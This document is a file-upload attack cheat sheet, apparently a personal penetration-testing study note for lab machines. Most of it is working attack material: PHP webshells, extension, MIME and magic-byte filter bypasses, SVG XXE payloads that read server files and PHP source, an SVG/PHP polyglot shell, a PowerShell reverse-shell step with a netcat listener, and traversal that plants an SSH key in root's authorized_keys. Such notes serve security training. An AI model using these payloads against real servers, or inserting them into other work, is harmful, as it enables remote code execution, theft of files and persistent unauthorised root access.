# File Upload Attacks, Command Appendix

Part of [[COMMAND APPENDIX]]. Getting an executable file past an upload filter, and what to do when the app won't ever execute what you upload at all.

---

## Webshell Creation

```bash
# Static command (for hostname/id checks)
cat << EOF > RCE.php
<?php system('hostname'); ?>
EOF

# Parameterised webshell ($REQUEST = GET + POST + cookie, more flexible than $GET alone)
cat << 'EOF' > RCE.php
<?php system($_REQUEST['cmd']); ?>
EOF

# Execute commands once uploaded
curl -s "http://<target>/uploads/RCE.php?cmd=cat+/flag.txt"
```

## Filter Bypass Techniques

**Extension bypass ladder (try in order):**
```
1. Direct .php upload          → if no filter at all
2. Case-swap: .pHP, .PHP       → if blacklist only checks lowercase literal
3. Legacy extensions: .phar, .phps, .pht, .phtm, .phtml, .pgif, .php7
4. Double extension: shell.php.jpg     → .jpg satisfies whitelist; misconfigured Apache executes .php anywhere in name
5. Reverse double extension: shell.phar.jpg  → .phar passes blacklist, .jpg ends the name for whitelist
6. Content-Type bypass: change header to image/gif or image/svg+xml in Burp
7. MIME type (magic bytes): prepend GIF8 to file content — mime_content_type() returns image/gif
```

**`.phar` is the highest-value alternative extension**, it's a legitimate PHP Archive format the PHP interpreter executes, and blacklists that block `.php`/`.phps`/`.phtml` routinely miss it.

**Extension fuzzing via Burp Intruder** (when you need to enumerate the whole blacklist):
```
1. Capture upload request → send to Intruder (Ctrl+I)
2. Clear payload positions, set: filename="RCE§.php§" (markers around the extension)
3. Payload: paste PHP extensions list (see below), disable URL encoding
4. Start attack → sort by Length → different length = "File successfully uploaded" hit
```

**PHP extensions list for Intruder:**
```
.php .php2 .php3 .php4 .php5 .php6 .php7 .phps .pht .phtm .phtml .pgif .shtml .phar .inc .hphp .ctp .module
```
Full list also at `/usr/share/SecLists/Discovery/Web-Content/web-extensions.txt`.

**Case-swap:**
```
.pHP  .PHP  .Php
```

**Confirm code execution once a webshell lands:**
```bash
curl "http://<target>/uploads/<shell>.phar?cmd=whoami"
# Uploaded files commonly land in /uploads/, /profile_images/, /user_feedback_submissions/, etc.
# Check the app's upload confirmation text for the exact path
```

**Windows reverse shell escalation via webshell** (base64 Unicode encoding for `-enc` flag):
```powershell
$Text = '<powershell reverse shell script>'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```
```bash
nc -nvlp 4444
curl "http://<target>/uploads/<shell>.pHP?cmd=powershell%20-enc%20<encoded_string_here>"
```
*`powershell -enc` expects UTF-16LE base64, not plain ASCII-then-base64.*

## Client-Side Bypass

**Method 1 — Burp intercept:**
1. Upload a real image, intercept the request in Burp
2. Change `filename="image.jpg"` → `filename="shell.php"`
3. Replace image bytes with `<?php system($_REQUEST['cmd']); ?>`
4. Forward request

**Method 2 — Browser DevTools:**
1. `Ctrl+Shift+C` → click the upload button/image area
2. In the `<form>` tag: change `onSubmit="return checkFile()"` → `onSubmit="upload()"`
3. In the `<input>` tag: remove `accept=".jpg,.jpeg,.png"` attribute
4. Upload a `.php` file normally, browser no longer restricts it

## Content-Type + MIME Bypass

```
# In Burp Repeater/Intercept:
# 1. Content-Type header: change to image/gif, image/jpeg, or image/svg+xml
# 2. File content: prepend GIF8 magic bytes (4 bytes, satisfies mime_content_type())
```

```
Content-Type: image/gif

GIF8
<?php system($_REQUEST['cmd']); ?>
```

**Content-Type fuzzing for allowed types:**
```bash
wget https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' | xclip -se c   # paste into Intruder Payload Options
```
Set the Intruder position around `image/jpeg` in the Content-Type header. Responses that say "File successfully uploaded" (not "Only images are allowed") are accepted types.

## SVG XXE — File Read and PHP Source Disclosure

When the app only accepts SVG images, inject XXE to read server files:

**Arbitrary file read:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
<svg>&xxe;</svg>
```

**PHP source code read (php://filter via XXE):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

```bash
# Save and upload:
cat << 'EOF' > shell.svg
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
EOF

# If the upload form doesn't accept .svg from the frontend:
mv shell.svg shell.jpeg
# Intercept in Burp → change filename="shell.svg" and Content-Type: image/svg+xml → forward
```

After upload, **view page source**, the file content appears inside the `<svg>` element. Decode base64:
```bash
echo 'BASE64BLOB' | base64 -d
```

**SVG+PHP polyglot** (SVG XML wrapper + PHP webshell in same file, used when SVG is allowed AND you need code execution):
```xml
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg> <?php system($_REQUEST['cmd']); ?>
```
The PHP interpreter ignores the XML before `<?php` and executes the webshell. Save as `.phar.svg` (or `.phar.jpeg` for frontend bypass → intercept to fix extension).

## Upload Date-Prefixed Filename Prediction

When `upload.php` source reveals `$fileName = date('ymd') . '_' . basename(...)`:
```bash
date +%y%m%d   # today's date prefix, e.g. 231130
# Full upload path: /contact/user_feedback_submissions/231130_shell.phar.svg
```

See [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]], [[File Upload Attacks (HTB Supplementary)]] (all new techniques above), [[Beep|Beep box writeup]] (null-byte trick on upload).

#### Tags: #FileUpload #ExtensionFilterBypass #CaseSwapBypass #Phar #DoubleExtension #ContentTypeBypass #MIMEBypass #GIFMagicBytes #SVG #XXE #BurpIntruder #ClientSideBypass #PowerShellReverseShell

---

## When Nothing You Upload Will Ever Execute

Some upload mechanisms genuinely have no code-execution path at all (think a plain file-storage form). If the `filename` field itself is traversal-able, the fix is to combine the upload with Directory Traversal instead: overwrite a sensitive file elsewhere on disk rather than relying on the uploaded content being executed.

**Step 1: generate a keypair to plant**
```bash
ssh-keygen -f <keyname>          # -f skips the interactive path prompt
cat <keyname>.pub > authorized_keys
```

**Step 2: intercept the upload in Burp and rewrite the filename to a traversal path**
Enable Intercept, select `authorized_keys` in the upload form, submit, then in the caught request change the `filename` field to:
```
../../../../../../../root/.ssh/authorized_keys
```
Forward it.

**Step 3: connect with the planted key**
```bash
rm ~/.ssh/known_hosts            # needed if the hostname was reused from an earlier lab VM
ssh -p <port> -i <keyname> root@<target>
```

*Worth checking before assuming this'll work: what happens if you upload the same filename twice? An "already exists" response can be abused to brute-force server file/directory names, and a differing error message can leak the backend language/framework. Also worth remembering: web apps built on a language's own bundled dev server (rather than deployed properly under Apache/Nginx/IIS) are frequently run as root/Administrator directly, always worth testing for this rather than assuming least-privilege.*

See [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] for the full worked walkthrough.

#### Tags: #UploadPlusTraversal #AuthorizedKeysOverwrite #SSHKeyPlanting #BurpFilenameRewrite

---

## **Outstanding**
This area grows alongside the modules. Whenever a new upload-bypass trick comes up (magic-byte/MIME spoofing, double extensions, polyglot files, etc), add it here with a link back to the source section.
